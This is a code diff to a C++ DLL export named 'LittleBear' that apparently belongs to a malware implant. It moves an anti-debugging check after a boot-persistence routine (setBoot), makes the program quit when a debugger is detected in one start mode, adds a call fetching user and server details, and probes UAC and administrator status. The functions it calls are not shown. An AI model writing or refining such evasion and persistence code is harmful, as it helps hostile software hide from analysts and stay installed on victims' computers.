@@ -79,15 +79,8 @@ extern "C" __declspec(dllexport) int __stdcall LittleBear()
 	}
 
 	char szout[1024];
-	int iRet = isDebugged();
-	if (iRet)
-	{
-#ifndef _DEBUG
-		writeRawLog("debuggered\r\n");
-		//return FALSE;
-#endif
-	}
-
+	int iRet = 0;
+	
 	//need to be first function
 	iRet = _GetApi();
 	if (iRet == 0)
@@ -100,6 +93,8 @@ extern "C" __declspec(dllexport) int __stdcall LittleBear()
 		//after work path created and getapi,u can write log file
 		//writeLog("_GetApi ok\r\n");
 	}
+
+	iRet = getUserAndServer();
 
 	iRet = furtherApi();
 
@@ -120,6 +115,17 @@ extern "C" __declspec(dllexport) int __stdcall LittleBear()
 #ifndef _DEBUG
 	iRet = setBoot(szSysDir, strPEResidence, iSystemVersion);
 #endif
+
+	iRet = isDebugged();
+	if (iRet)
+	{
+#ifndef _DEBUG
+		writeRawLog("debuggered\r\n");
+		if (gStartMode == ONE_EXE_AND_ONE_DLL) {
+			return FALSE;
+	}
+#endif
+}
 
 	DWORD uac = IsUACEnable(iCpuBits, &iEnableLUA, &iConsentPromptBehaviorAdmin, &iPromptOnSecureDesktop);
 	iIsUserAdmin = IsAdministratorUser();
